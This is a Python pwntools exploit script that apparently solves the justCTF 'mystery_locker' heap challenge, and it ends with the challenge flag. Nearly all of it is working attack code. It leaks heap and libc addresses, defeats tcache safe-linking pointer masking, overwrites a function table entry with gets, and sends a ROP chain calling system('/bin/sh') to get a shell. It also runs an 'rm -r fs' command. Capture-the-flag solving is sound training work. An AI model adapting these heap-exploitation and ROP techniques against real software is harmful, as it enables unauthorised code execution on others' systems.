#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *
import os

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './mystery_locker_patched'
context.terminal = ['tmux', 'new-window']
argv = []
#env = {'LD_PRELOAD':'./libc.so.6'}
env = {}
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def create(fname, content, csz, fsz= 0):
    io.sendlineafter(">", str(0))
    if fsz > 0:
        io.sendlineafter("size:", str(fsz))
    else:
        io.sendlineafter("size:", str(len(fname)))
    io.sendlineafter("name: ", fname)
    io.sendlineafter("len: ", str(csz))
    io.sendlineafter("contents: ", content)

def rename(fname):
    io.sendlineafter(">", str(1))
    io.sendlineafter("size:", str(len(fname)))
    io.sendlineafter("name: ", fname)

def show(fname,fsz=0):
    io.sendlineafter(">", str(2))
    if fsz > 0:
        io.sendlineafter("size:", str(fsz))
    else:
        io.sendlineafter("size:", str(len(fname)))
    io.sendlineafter("name: ", fname)

def remove(fname, fsz=0):
    io.sendlineafter(">", str(3))
    if fsz > 0:
        io.sendlineafter("size:", str(fsz))
    else:
        io.sendlineafter("size:", str(len(fname)))
    io.sendlineafter("name: ", fname)

def mask(p, l):
    return p ^ (l >> 12)

def unmask(p, l):
    return mask(p, l)

def new_ptr_addr(next_addr):
    sz = 0x40

    while sz < 0x400:
        masked = mask(next_addr+sz, next_addr)
        lb = masked & 0xff
        masked = (masked >> 16) << 16
        masked += lb

        new_addr = unmask(masked, next_addr)

        if new_addr > next_addr:
            print(f"New addr: {hex(new_addr)} sz: {sz}")
            return sz, new_addr

        sz += 0x10

    return 0, 0

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# max size = 0x400
os.system("rm -r fs")

io = start(argv, env=env)

create("a", "A\x00", 0x10)
remove("a")
create("a", "\x00", 0x10)

show("a")
leak = io.recvuntil("C")[-6:-1]
leak = leak.ljust(0x8, b'\x00')
leak = u64(leak) << 12

heap_base = leak
print("Heap base: ", hex(leak))

chunk_addr = heap_base + 0x310 + 0x820
print("Next chunk addr: ", hex(chunk_addr))

sz, new_addr = new_ptr_addr(chunk_addr)

if sz == 0x0:
    exit(0)

create("c\x00", "\x00", 0x400, 0x400)
create("b\x00", "\x00", sz-0x8, sz-0x8)

remove("c\x00", 0x821)

next_addr = chunk_addr + sz*2

if new_addr - next_addr > 0x10000:
    exit(0)

remove("z\x00", 0x400)
remove("z\x00", 0x18)
remove("z\x00", 0x18)
print("Allocating until next is overlap")
while next_addr < new_addr - 0x40:
    if not args.LOCAL:
        print("Tick")
    if new_addr - next_addr > 0x440:
        remove("z\x00", 0x400-8)
        next_addr += 0x400
    else:
        remove("z\x00", 0x18)
        next_addr += 0x20

payload = b"A"*0x18
payload += p16(0x501)
create("n\x00",  payload + b"\x00", 0x100)

remove("z\x00", 0x38)
create("la\x00", "\x00",0x400, 0x400)
remove("z\x00", 0x400)
remove("z\x00", 0x400)
create("m", b"\x00", 0x38)

create("d", b"\x00", 0x400)

show("d")
leak = io.recvuntil("C")[-6:-1]
leak = leak.ljust(0x8, b'\x00')
leak = u64(leak) << 8

libc.address = leak - 0x1f7100

print("Libc leak: ", hex(libc.address))

func_table = heap_base + 0x2a0

print("Func table: ", hex(func_table))

create("e\x00", b"\x00", 0x400, 0x400)

print("Next addr: ", hex(next_addr))
payload = b"B"*0x20
payload += p64(mask(func_table-0x10, next_addr+0x40))
payload = payload[:-1]
create("f", payload, 0x100)

remove("g\x00", 0x400)

payload = b"A"*0x10
payload += p64(libc.sym['gets'])[:-1]

remove(payload, 0x400)
create("h", "A\x00", 0x40)

io.sendlineafter(">", str(4))

gdb.attach(io, gdbscript)
rop = ROP(libc)
off = 0x540-0x18
payload = b"A"*off
payload += p64(rop.rdi.address)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(rop.ret.address)
payload += p64(libc.sym['system'])

io.sendline(payload)

io.interactive()

# justCTF{0h_n0_y0u_unl0ck3d_my_l0ck3r_4nd_th3r3_1s_4_h34p_0f_c01ns_1ns1de}
